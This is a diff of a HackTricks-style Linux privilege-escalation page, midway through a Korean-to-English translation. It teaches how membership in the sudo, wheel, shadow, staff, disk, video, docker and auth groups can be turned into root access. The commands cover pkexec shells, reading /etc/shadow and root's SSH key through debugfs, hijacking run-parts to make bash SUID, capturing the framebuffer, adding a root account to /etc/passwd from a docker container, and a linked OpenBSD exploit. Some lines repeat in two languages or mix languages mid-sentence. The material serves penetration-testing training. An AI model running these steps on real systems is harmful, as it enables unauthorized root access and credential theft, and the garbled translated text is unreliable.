@@ -1,25 +1,25 @@
-# 흥미로운 그룹 - 리눅스 권한 상승
+# Interesting Groups - Linux Privesc
 
 {% hint style="success" %}
-AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricks 지원</summary>
+<summary>Support HackTricks</summary>
 
-* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
-* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 저장소에 PR을 제출하여 해킹 요령을 공유하세요.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Sudo/Admin 그룹
+## Sudo/Admin Groups
 
-### **PE - 방법 1**
+### **PE - Method 1**
 
-**가끔**, **기본적으로 (또는 어떤 소프트웨어가 필요로 하는 경우)** **/etc/sudoers** 파일 내에 다음과 같은 라인들을 찾을 수 있습니다:
+**때때로**, **기본적으로 (또는 일부 소프트웨어가 필요하기 때문에)** **/etc/sudoers** 파일 안에서 다음과 같은 줄을 찾을 수 있습니다:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -27,36 +27,36 @@ GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-s
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-이는 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.
+이것은 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있다는 것을 의미합니다**.
 
-이 경우, **루트가 되려면 다음을 실행하면 됩니다**:
+이 경우, **root가 되려면 다음을 실행하면 됩니다**:
 ```
 sudo su
 ```
-### PE - 방법 2
+### PE - Method 2
 
-모든 suid 이진 파일을 찾아 이진 파일 **Pkexec**이 있는지 확인하십시오:
+모든 suid 바이너리를 찾고 **Pkexec** 바이너리가 있는지 확인하십시오:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-만약 **pkexec 바이너리가 SUID 바이너리**이고 **sudo** 또는 **admin** 그룹에 속해 있다면, `pkexec`를 사용하여 바이너리를 sudo 권한으로 실행할 수 있습니다.\
-일반적으로 이러한 그룹들이 **polkit 정책** 내에 포함되어 있기 때문입니다. 이 정책은 주로 어떤 그룹이 `pkexec`를 사용할 수 있는지 식별합니다. 다음 명령어로 확인할 수 있습니다:
+만약 **pkexec가 SUID 바이너리**이고 당신이 **sudo** 또는 **admin** 그룹에 속한다면, 아마도 `pkexec`를 사용하여 sudo로 바이너리를 실행할 수 있을 것입니다.\
+이는 일반적으로 이러한 그룹이 **polkit 정책** 내에 있기 때문입니다. 이 정책은 기본적으로 어떤 그룹이 `pkexec`를 사용할 수 있는지를 식별합니다. 다음을 사용하여 확인하세요:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-다음은 어떤 그룹이 **pkexec**를 실행할 수 있는지 및 **기본적으로** 일부 리눅스 배포판에서 **sudo** 및 **admin** 그룹이 나타나는지 확인할 수 있습니다.
+여기에서 어떤 그룹이 **pkexec**를 실행할 수 있는지 확인할 수 있으며, **기본적으로** 일부 리눅스 배포판에서는 **sudo**와 **admin** 그룹이 나타납니다.
 
-**루트로 전환하려면 실행할 수 있습니다**:
+**루트가 되려면 다음을 실행할 수 있습니다**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-만약 **pkexec**를 실행하려고 시도하고 다음 **오류**가 발생한다면:
+만약 **pkexec**를 실행하려고 시도했는데 이 **error**가 발생한다면:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**권한이 없는 것이 아니라 GUI 없이 연결되지 않았기 때문입니다**. 이 문제에 대한 해결책이 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **다른 2개의 ssh 세션이 필요합니다**:
+**권한이 없어서가 아니라 GUI 없이 연결되어 있지 않기 때문입니다**. 이 문제에 대한 해결 방법은 여기에서 확인할 수 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2개의 서로 다른 ssh 세션**이 필요합니다:
 
 {% code title="session1" %}
 ```bash
@@ -66,38 +66,38 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 {% endcode %}
 
-{% code title="세션2" %}
+{% code title="session2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 {% endcode %}
 
-## Wheel 그룹
+## Wheel Group
 
-**가끔**, **기본적으로** **/etc/sudoers** 파일 안에 이 줄을 찾을 수 있습니다:
+**때때로**, **기본적으로** **/etc/sudoers** 파일 안에서 이 줄을 찾을 수 있습니다:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
-이는 **wheel 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.
+이것은 **wheel 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있음을 의미합니다**.
 
-이 경우, **루트가 되려면 다음을 실행하면 됩니다**:
+이 경우, **root가 되려면 다음을 실행하면 됩니다**:
 ```
 sudo su
 ```
-## 그림자 그룹
+## Shadow Group
 
-**그림자 그룹**의 사용자는 **/etc/shadow** 파일을 **읽을** 수 있습니다:
+**shadow** 그룹의 사용자들은 **/etc/shadow** 파일을 **읽을** 수 있습니다:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-그래서, 파일을 읽고 일부 해시를 **해독**해보십시오.
+So, read the file and try to **crack some hashes**.
 
-## 직원 그룹
+## Staff Group
 
-**staff**: 사용자가 루트 권한이 필요하지 않고 시스템 (`/usr/local`)에 로컬 수정 사항을 추가할 수 있게 합니다 (`/usr/local/bin`에 있는 실행 파일은 모든 사용자의 PATH 변수에 있으며, 동일한 이름의 `/bin` 및 `/usr/bin`에 있는 실행 파일을 "덮어쓸" 수 있습니다). 모니터링/보안과 관련된 "adm" 그룹과 비교하십시오. [\[원본\]](https://wiki.debian.org/SystemGroups)
+**staff**: 사용자가 루트 권한 없이 시스템에 로컬 수정을 추가할 수 있도록 허용합니다 (`/usr/local`). (`/usr/local/bin`의 실행 파일은 모든 사용자의 PATH 변수에 포함되어 있으며, 동일한 이름의 `/bin` 및 `/usr/bin`의 실행 파일을 "덮어쓸" 수 있습니다). 모니터링/보안과 더 관련된 "adm" 그룹과 비교하십시오. [\[source\]](https://wiki.debian.org/SystemGroups)
 
-데비안 배포판에서 `$PATH` 변수는 특권 사용자 여부에 관계없이 `/usr/local/`이 가장 높은 우선순위로 실행됨을 보여줍니다.
+debian 배포판에서 `$PATH` 변수는 `/usr/local/`가 특권 사용자 여부에 관계없이 가장 높은 우선 순위로 실행됨을 보여줍니다.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -105,9 +105,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-만약 `/usr/local`에서 일부 프로그램을 탈취할 수 있다면 루트 권한을 쉽게 얻을 수 있습니다.
+`/usr/local`에 있는 일부 프로그램을 탈취할 수 있다면, 우리는 쉽게 root 권한을 얻을 수 있습니다.
 
-`run-parts` 프로그램을 탈취하는 것은 루트 권한을 얻기 쉬운 방법입니다. 왜냐하면 대부분의 프로그램이 `run-parts`와 유사한 것을 실행하기 때문입니다(crontab, ssh 로그인 시).
+`run-parts` 프로그램을 탈취하는 것은 root 권한을 얻는 쉬운 방법입니다. 왜냐하면 대부분의 프로그램이 (crontab, ssh 로그인 시) `run-parts`를 실행하기 때문입니다.
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -128,7 +128,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-**악용**
+**익스플로잇**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -147,11 +147,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-## 디스크 그룹
+## Disk Group
 
-이 권한은 거의 **루트 액세스와 동등**하며 기계 내의 모든 데이터에 액세스할 수 있습니다.
+이 권한은 **루트 접근과 거의 동등**하며, 머신 내부의 모든 데이터에 접근할 수 있습니다.
 
-파일: `/dev/sd[a-z][1-9]`
+Files:`/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -160,47 +160,48 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-**주의:** debugfs를 사용하여 **파일을 작성**할 수도 있습니다. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음을 수행할 수 있습니다:
+Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:  
+디버그 파일 시스템(debugfs)을 사용하면 **파일을 쓸 수** 있다는 점에 유의하세요. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음과 같이 할 수 있습니다:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-그러나 **루트 소유의 파일을 쓰려고** 시도하면 (`/etc/shadow` 또는 `/etc/passwd`와 같은) "**허가 거부**" 오류가 발생합니다.
+그러나 **root가 소유한 파일**(예: `/etc/shadow` 또는 `/etc/passwd`)에 **쓰기**를 시도하면 "**Permission denied**" 오류가 발생합니다.
 
-## 비디오 그룹
+## Video Group
 
-명령어 `w`를 사용하여 **시스템에 로그인한 사용자를** 찾을 수 있으며, 다음과 같은 출력이 표시됩니다:
+`w` 명령어를 사용하면 **시스템에 로그인한 사람**을 찾을 수 있으며, 다음과 같은 출력을 보여줍니다:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-**tty1**은 사용자 **yossi가 머신의 터미널에 물리적으로 로그인**되어 있는 것을 의미합니다.
+The **tty1**는 사용자 **yossi가 물리적으로** 머신의 터미널에 로그인했음을 의미합니다.
 
-**video 그룹**은 화면 출력을 볼 수 있는 권한을 갖고 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 화면의 현재 이미지를 원시 데이터로 **캡처하고** 화면이 사용 중인 해상도를 얻어야 합니다. 화면 데이터는 `/dev/fb0`에 저장될 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 찾을 수 있습니다.
+**video group**은 화면 출력을 볼 수 있는 권한이 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 **현재 화면의 이미지를** 원시 데이터로 가져오고 화면이 사용하는 해상도를 알아야 합니다. 화면 데이터는 `/dev/fb0`에 저장할 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 찾을 수 있습니다.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-**원본 이미지**를 **열려면** **GIMP**를 사용할 수 있습니다. \*\*`screen.raw` \*\* 파일을 선택하고 파일 유형으로 **Raw image data**를 선택하십시오:
+To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:
 
 ![](<../../../.gitbook/assets/image (463).png>)
 
-그런 다음 너비와 높이를 화면에서 사용하는 값으로 수정하고 다양한 이미지 유형을 확인하십시오 (화면을 더 잘 보여주는 것을 선택하십시오):
+Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
 
 ![](<../../../.gitbook/assets/image (317).png>)
 
-## 루트 그룹
+## Root Group
 
-기본적으로 **루트 그룹의 구성원**은 **일부 서비스 구성 파일**이나 **라이브러리 파일** 또는 **권한 상승에 사용될 수 있는 기타 흥미로운 것들**을 수정할 수 있는 것으로 보입니다...
+기본적으로 **root 그룹의 구성원**은 **서비스** 구성 파일이나 **라이브러리** 파일 또는 **권한 상승**에 사용될 수 있는 **기타 흥미로운 것들**을 **수정**할 수 있는 접근 권한을 가질 수 있는 것 같습니다...
 
-**루트 구성원이 수정할 수 있는 파일을 확인하십시오**:
+**root 구성원이 수정할 수 있는 파일 확인**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-## 도커 그룹
+## Docker Group
 
-호스트 머신의 루트 파일 시스템을 인스턴스의 볼륨에 **마운트**할 수 있으므로 인스턴스가 시작되면 해당 볼륨에 `chroot`가 즉시 로드됩니다. 이로써 머신에서 root 액세스를 얻을 수 있습니다.
+호스트 머신의 **루트 파일 시스템을 인스턴스의 볼륨에 마운트**할 수 있으므로, 인스턴스가 시작될 때 즉시 해당 볼륨에 `chroot`를 로드합니다. 이는 사실상 머신에서 루트 권한을 부여합니다.
 ```bash
 docker image #Get images from the docker service
 
@@ -212,12 +213,45 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
+마지막으로, 이전의 제안 중 마음에 들지 않거나 어떤 이유로 작동하지 않는 경우(도커 API 방화벽?) **특권이 있는 컨테이너를 실행하고 그로부터 탈출하는** 방법을 시도할 수 있습니다. 여기에서 설명합니다:
+
+{% content-ref url="../docker-security/" %}
+[docker-security](../docker-security/)
+{% endcontent-ref %}
+
+도커 소켓에 대한 쓰기 권한이 있는 경우 [**도커 소켓을 악용하여 권한을 상승시키는 방법에 대한 이 게시물을 읽어보세요**](../#writable-docker-socket)**.**
+
+{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+
+{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+
 ## lxc/lxd 그룹
 
-일반적으로 **`adm`** 그룹의 **구성원**은 _/var/log/_ 내에 있는 **로그 파일을 읽을 수 있는 권한**을 가지고 있습니다.\
-따라서, 이 그룹 내의 사용자를 침해했다면 **로그를 확인**해야 합니다.
+{% content-ref url="./" %}
+[.](./)
+{% endcontent-ref %}
+
+## Adm 그룹
+
+일반적으로 **`adm`** 그룹의 **구성원**은 _/var/log/_에 위치한 **로그** 파일을 **읽을** 수 있는 권한이 있습니다.\
+따라서 이 그룹 내의 사용자를 손상시킨 경우 **로그를 확인해야** 합니다.
 
 ## Auth 그룹
 
-OpenBSD 내에서 **auth** 그룹은 일반적으로 _**/etc/skey**_ 및 _**/var/db/yubikey**_ 폴더에 쓸 수 있습니다.\
-이러한 권한은 다음 exploit을 사용하여 **루트 권한 상승**에 악용될 수 있습니다: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+OpenBSD 내에서 **auth** 그룹은 사용되는 경우 _**/etc/skey**_ 및 _**/var/db/yubikey**_ 폴더에 쓸 수 있습니다.\
+이 권한은 다음의 익스플로잇을 사용하여 **루트로 권한을 상승시키는** 데 악용될 수 있습니다: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+
+{% hint style="success" %}
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>HackTricks 지원하기</summary>
+
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
+
+</details>
+{% endhint %}
